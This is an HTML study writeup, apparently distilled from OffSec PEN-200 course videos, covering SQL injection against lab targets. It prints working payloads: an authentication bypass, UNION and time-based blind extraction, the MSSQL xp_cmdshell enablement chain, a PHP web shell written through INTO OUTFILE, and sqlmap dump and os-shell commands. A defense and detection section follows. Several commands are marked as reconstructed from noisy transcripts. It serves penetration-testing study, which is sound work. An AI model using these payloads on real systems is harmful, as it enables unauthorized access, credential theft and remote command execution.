@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-200 SQLI — SQL Injection Attacks — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../oscp.html">OSCP (PEN-200)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSCP (PEN-200)</p>
+<h1 class="nz-h2">PEN-200 SQLI — SQL Injection Attacks</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<blockquote>
+<p>Distilled from OffSec PEN-200 (OSCP) course material (modules 35–40, SQL Injection Attacks block) — internal training reference, not for redistribution.</p>
+</blockquote>
+<h2>Objective</h2>
+<p>Move from the web application layer (writeup 04) to its data layer: understand how databases power dynamic apps, inject through parameters to bypass authentication, extract data with UNION-based and blind techniques, and escalate from SQL injection to <strong>code execution</strong> on the database host — first manually (<code>xp_cmdshell</code> on MSSQL, <code>INTO OUTFILE</code> web shell on MySQL), then automated with <strong>sqlmap</strong> including <code>--os-shell</code>.</p>
+<p>The block's arc, in the course's own order:</p>
+<ol>
+<li><strong>Databases in web apps</strong> — the request flow through PHP to MySQL, the two layered access levels, and the two DBMSes used in the labs (MySQL and MSSQL).</li>
+<li><strong>MySQL</strong> — direct CLI access: version/current-user fingerprinting, database/table/user enumeration, the <code>mysql</code> system schema, and authentication storage.</li>
+<li><strong>MSSQL</strong> — direct CLI access via Impacket's <code>mssqlclient.py</code> (Windows auth), <code>@@version</code>, <code>sys.databases</code>, <code>information_schema</code>.</li>
+<li><strong>Error-based injection &amp; authentication bypass</strong> — the login form, breaking the query with a quote, <code>' OR 1=1 --</code>, fingerprinting via version(), dumping credentials one column at a time.</li>
+<li><strong>UNION-based extraction</strong> — column-count discovery with ORDER BY, type alignment with NULL/function shifting, schema mapping via <code>information_schema</code>, credential harvesting.</li>
+<li><strong>Blind injection</strong> — Boolean-based (AND 1=1) and time-based (SLEEP/IF) inference, then automation with sqlmap.</li>
+<li><strong>Code execution</strong> — MSSQL <code>xp_cmdshell</code> enablement chain; MySQL <code>INTO OUTFILE</code> web shell into the web root.</li>
+<li><strong>sqlmap end-to-end</strong> — fingerprint, <code>--dump</code>, request-file mode (<code>-r</code>), and <code>--os-shell</code> for an interactive command shell.</li>
+</ol>
+<h2>Target surface</h2>
+<p>Labs: <strong>mountaindesserts.com</strong> (Apache/PHP + MySQL — the same static host mapping as earlier blocks; no lab IP is stated in the narration, use your lab gateway's IP) and the <strong>SQLite playground</strong> ⚠ (ASR; the injection-training web app used for the manual injection exercises, reached by browsing from Kali — despite the name, the demonstrated payloads are MySQL-syntax). Attack box is stock Kali. Direct-CLI exercises run against a local MySQL server and a <strong>Windows-based MSSQL server in the lab network</strong> (credentials [REDACTED]).</p>
+<p>Key facts established across the videos:</p>
+<ul>
+<li><strong>Two access levels</strong>: the <em>direct</em> level (log in as the actual DB user, e.g. <code>root</code> — full DB control) and the <em>indirect</em> level (speak SQL through the web app, which logs in with restricted app credentials). SQL injection operates at the indirect level; direct-level techniques give reference maps for what to look for.</li>
+<li>The app's PHP backend assembles queries by <strong>string concatenation</strong> of user input — the root cause of every injection below.</li>
+<li>The playground app has <strong>GET parameters <code>uname</code> and <code>password</code></strong> feeding the login query, plus a <strong>customers page</strong> with a <code>LIKE '%'-style filter</code> ⚠ parameter.</li>
+<li>Passwords in the lab tables are stored as <strong>MD5 hashes</strong> — crackable, making extraction immediately actionable.</li>
+<li>MySQL 8+ stores hashes as <code>caching_sha2_password</code> ⚠ (per narration; the actual string read from the <code>authentication_string</code> column) in the <code>mysql.user</code> table.</li>
+</ul>
+<h2>Techniques</h2>
+<blockquote>
+<p>The narration describes workflows; commands below are normalized/reconstructed from the described actions (noisy ASR). Items marked ⚠ are ambiguities to re-verify in the lab. All credentials are [REDACTED].</p>
+</blockquote>
+<h3>1. MySQL from the command line</h3>
+<pre><code class="language-bash">mysql -u root -p        # or: mysql -u root -p&lt;password&gt;  (password prompted; [REDACTED])
+SELECT version();       # → 8.x  — fingerprint first
+SELECT current_user();  # ⚠ narration reads &quot;current user via the system user function&quot; — normalize to current_user()/user()/system_user()
+SHOW databases;
+USE &lt;db&gt;;
+SHOW tables;
+SELECT * FROM &lt;table&gt;;
+</code></pre>
+<p>Enumerate the MySQL <strong>system database</strong> (<code>mysql</code>) — every DBMS ships with metadata databases:</p>
+<pre><code class="language-sql">SELECT user, authentication_string FROM mysql.user;   -- account + hash (&quot;caching_sha2_password&quot; ⚠)
+-- hashes are stored hashed, not cleartext — crackable offline, not directly usable
+</code></pre>
+<h3>2. MSSQL from the command line (Impacket)</h3>
+<pre><code class="language-bash">impacket-mssqlclient &lt;user&gt;:[REDACTED]@&lt;mssql-server&gt; -windows-auth
+# (Kali wrapper for the transcript's &quot;mPacket ms-sql client&quot; — Impacket's mssqlclient.py)
+</code></pre>
+<pre><code class="language-sql">SELECT @@version;                 -- MSSQL fingerprint
+SELECT name FROM sys.databases;   -- custom DBs + the four defaults:
+                                  -- master, tempdb, model, msdb
+USE offsec;                       -- the lab's custom database
+SELECT * FROM information_schema.tables;   -- metadata view, equivalent of MySQL's information_schema
+SELECT * FROM offsec.dbo.users;            -- &quot;dbo&quot; = database owner default schema
+-- → users table with CLEARTEXT passwords (unlike MySQL's hashed storage) — a real-world finding
+</code></pre>
+<p>Cross-DBMS constants to memorize: both expose <code>information_schema</code>; version functions and schema details differ (<code>version()</code> vs <code>@@version</code>, <code>mysql.user</code> vs <code>sys.databases</code>).</p>
+<h3>3. Error-based injection and authentication bypass</h3>
+<p>Login queries are the classic injection point — the input is wrapped directly into a <code>SELECT ... WHERE</code> clause.</p>
+<pre><code class="language-sql">-- the app's (conceptual) query:
+SELECT * FROM users WHERE username='&lt;input1&gt;' AND password='&lt;input2&gt;';
+</code></pre>
+<p><strong>Fingerprint the query shape with a quote:</strong> submit <code>'</code> (URL-encoded <code>%27</code> when using curl) → <strong>SQL syntax error</strong> proves injection, and the error text leaks query structure/DBMS. Alternatives in other contexts: quotes are unnecessary in numeric fields — try <code>1==1</code> ⚠ (narration; likely <code>1=1</code>), or <code>1=1</code> followed by a quote.</p>
+<p><strong>Authentication bypass:</strong></p>
+<pre><code class="language-bash">curl &quot;http://mountaindesserts.com/mountaindesterts/?uname=admin%27+OR+1%3D1+--+&amp;password=&lt;anything&gt;&quot;
+# ' OR 1=1 --  : the quote closes the input, 1=1 makes WHERE always true,
+# -- comments out the rest (the password check and the trailing quote)
+# → logged in as the first matching user (the admin account)
+</code></pre>
+<p>The password field no longer matters — the WHERE clause can't fail. Bypass confirms exploitable injection <em>and</em> grants an authenticated session in one step.</p>
+<p><strong>Extract data through error messages.</strong> Errors print evaluation results, so make the error message carry the data:</p>
+<pre><code class="language-bash">curl &quot;.../index.php?uname=%27+OR+1%3D1+OR+version%28%29+%3D+%27...%27+--+&amp;password=x&quot;
+# → version() appears in the error message (MySQL 8.x)
+</code></pre>
+<p><strong>Dump one column at a time</strong> (error output shows a single column):</p>
+<pre><code class="language-sql">' OR 1=1 AND password='&lt;extracted&gt;' --    -- binary-search style: iterate until the error disappears
+-- → password column of the admin row, an MD5 hash
+</code></pre>
+<p>⚠ The narration's exact query shape is unclear — the demonstrated idea is: force the target column's value into the error message, adjust, repeat. The same one-column-at-a-time logic powers blind extraction (section 5).</p>
+<h3>4. UNION-based extraction</h3>
+<p>UNION is the efficient extraction method: append a second SELECT with matching column count/types.</p>
+<p><strong>Find the column count with ORDER BY</strong> (numbers sort by column position; anything past the last column errors):</p>
+<pre><code class="language-sql">' ORDER BY 1 --    ... 2 ... 3 ... 4 ... 5 --
+-- 5 → error ⇒ the query selects 4 columns
+</code></pre>
+<p><strong>Match types with the SELECT list.</strong> The first column is an integer ID — a string there breaks the UNION:</p>
+<pre><code class="language-sql">' UNION SELECT null, null, null, current_user() --
+</code></pre>
+<p>Shift function calls right past typed columns. Then walk the schema via <code>information_schema</code>:</p>
+<pre><code class="language-sql">' UNION SELECT null, table_name, null, null FROM information_schema.tables --
+' UNION SELECT null, column_name, null, null FROM information_schema.columns WHERE table_name='users' --
+-- finds a password column
+' UNION SELECT null, username, password, null FROM users --
+-- → usernames + MD5 password hashes → crack the hashes offline
+</code></pre>
+<h3>5. Blind injection (Boolean and time-based) → sqlmap</h3>
+<p>When output or errors don't reflect data, infer <strong>one yes/no question per request</strong>. The demo parameter defaults to <code>offsec</code>; the page content (e.g. displayed information) changes depending on whether the WHERE clause matched.</p>
+<p><strong>Boolean-based</strong> — compare responses to a known-true and a known-false condition:</p>
+<pre><code class="language-bash">curl &quot;http://&lt;playground&gt;/index.php?user=offsec' AND 1=1 -- &quot;   # normal page
+curl &quot;http://&lt;playground&gt;/index.php?user=offsec' AND 1=2 -- &quot;   # blank/different page
+# response diff = an oracle; script it to extract data bit by bit
+</code></pre>
+<p><strong>Time-based</strong> — when the page is identical either way, use latency as the oracle:</p>
+<pre><code class="language-sql">offsec' AND IF(&lt;condition&gt;, SLEEP(3), 0) --
+-- 3-second delay on TRUE conditions = a slow but reliable oracle
+</code></pre>
+<p><strong>Automate with sqlmap</strong> (boilerplate gone, but check every "automated" result):</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://&lt;playground&gt;/index.php?user=offsec&quot; -p user
+# → detects the time-based blind payload; DBMS fingerprinted
+</code></pre>
+<h3>6. Manual code execution</h3>
+<p><strong>MSSQL: <code>xp_cmdshell</code>.</strong> Disabled by default; the enablement is a three-step chain needing admin rights:</p>
+<pre><code class="language-sql">EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+-- → command output as the SQL service account
+</code></pre>
+<p>⚠ The narration's exact chain ("check whether it's enabled with the correct function, then enable it") is summarized above per standard MSSQL procedure — verify the exact statements in the lab. A direct path to a Windows shell; ⚠ the narration hints at following up toward an interactive reverse shell via cmd/PowerShell.</p>
+<p><strong>MySQL: <code>SELECT ... INTO OUTFILE</code>.</strong> Write query output — a PHP web shell — into a web-servable folder:</p>
+<pre><code class="language-sql">SELECT &quot;&lt;?php echo system($_GET['cmd']); ?&gt;&quot; INTO OUTFILE '/var/www/html/webshell.php';
+</code></pre>
+<p>Requirements: the target folder must be writable by the MySQL process, and MySQL must be permitted to write files (secure-file-priv permitting ⚠ — not stated in the narration). Then:</p>
+<pre><code class="language-bash">curl &quot;http://mountaindesserts.com/webshell.php?cmd=ls&quot;
+# → output; commands run as the web server user (www-data)
+</code></pre>
+<p>⚠ On stock MySQL 8, <code>INTO OUTFILE</code> into a fresh file is blocked by <code>secure-file-priv</code> and existing files can't be overwritten — treat the demo as the ideal case and test in your lab.</p>
+<h3>7. sqlmap end-to-end</h3>
+<p>sqlmap automates the whole chain — fingerprinting, extraction, and code execution. Verify every finding manually (avoid over-reliance on automation).</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://&lt;playground&gt;/index.php?user=offsec&quot; -p user
+# → time-based blind detected, DBMS fingerprinted
+sqlmap -u &quot;...&quot; -p user --dump
+# → table contents incl. credentials (slow over time-based blind — [REDACTED] in the demo)
+</code></pre>
+<p><strong>Request-file mode</strong> (much more reliable for authenticated/POST forms — hands sqlmap the <em>exact</em> request):</p>
+<ol>
+<li>Send the login request through Burp once.</li>
+<li>Right-click → <strong>Copy to file</strong> → save as <code>sqlmap.txt</code>.</li>
+<li><code>sqlmap -r sqlmap.txt -p &lt;parameter&gt;</code> — sqlmap replays the request with cookies intact.</li>
+</ol>
+<p><strong><code>--os-shell</code></strong> — interactive command execution through the same <code>INTO OUTFILE</code> web-shell technique:</p>
+<pre><code class="language-bash">sqlmap -r sqlmap.txt -p item --os-shell
+# → sqlmap asks for a writable web folder, uploads its shell, gives an interactive prompt
+# → whoami / systeminfo: commands as www-data
+</code></pre>
+<hr />
+<h2>Detection &amp; defense</h2>
+<p>Defensive readings of each technique:</p>
+<ul>
+<li><strong>Never concatenate input into SQL.</strong> Parameterized queries / prepared statements are the fix for every technique in this writeup — the injection itself (quote fingerprint, <code>' OR 1=1</code>, UNION, blind) all die at the prepared-statement boundary. This is the single highest-leverage control.</li>
+<li><strong>Error hygiene.</strong> Detailed DBMS errors are an oracle: they confirm injection, leak query structure, and carried the error-based extraction. Log errors server-side; return generic messages client-side.</li>
+<li><strong>Least privilege for the app's DB user.</strong> The <code>' OR 1=1</code> bypass succeeded against the admin account and UNION read other tables because the app user could. Restrict the app account to its own schema, revoke file-write (<code>FILE</code>) and <code>xp_cmdshell</code>-relevant privileges, and never run the app as DB admin — the <code>INTO OUTFILE</code> web shell and <code>xp_cmdshell</code> chain both required exactly that.</li>
+<li><strong>Hash, don't store, credentials</strong> — and not MD5. The demo's cleartext (MSSQL) and MD5 (playground) passwords made extraction immediately weaponizable; use salted, memory-hard hashes (bcrypt/Argon2) so a dump still isn't an account list.</li>
+<li><strong>Blind injection needs no output.</strong> Parameter filtering alone can't stop Boolean/time-based oracles — only parameterized queries do. Network-side, alert on request bursts against a single parameter (blind automation is chatty), anomalous <code>SLEEP</code>-like latencies, and UNION/information_schema strings in parameters (WAF rules for common payloads, accepting they are bypassable).</li>
+<li><strong>sqlmap's <code>--os-shell</code> is <code>INTO OUTFILE</code> + a writable web root</strong> — lock down <code>secure-file-priv</code>, keep the web root non-writable by the DB service account, and monitor for unexpected <code>.php</code> files appearing in it.</li>
+<li><strong>Monitoring angle:</strong> single quotes and comment sequences (<code>--</code>) in parameters, <code>information_schema</code>/<code>UNION SELECT</code> in request bodies, sequential <code>ORDER BY N</code> probes, and MSSQL <code>sp_configure</code>/<code>RECONFIGURE</code> in the DB audit log are high-signal, cheap detections.</li>
+</ul>
+<hr />
+<p><em>Source: 6 SQL injection video transcripts (PEN-200 modules 35–40). Noisy-ASR corrections: "mPacket ms-sql client" → Impacket <code>mssqlclient</code>; "SystemUser function" → <code>current_user()</code>/<code>system_user()</code> ⚠; "system catalog" → <code>sys.databases</code>/<code>information_schema</code>; "SQLite playground" ⚠ kept as narrated (payloads shown are MySQL-syntax); "input field separators"-class artifacts corrected per narration. No lab IPs appear in the source transcripts; DB credentials and dumped passwords are [REDACTED] above.</em></p>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
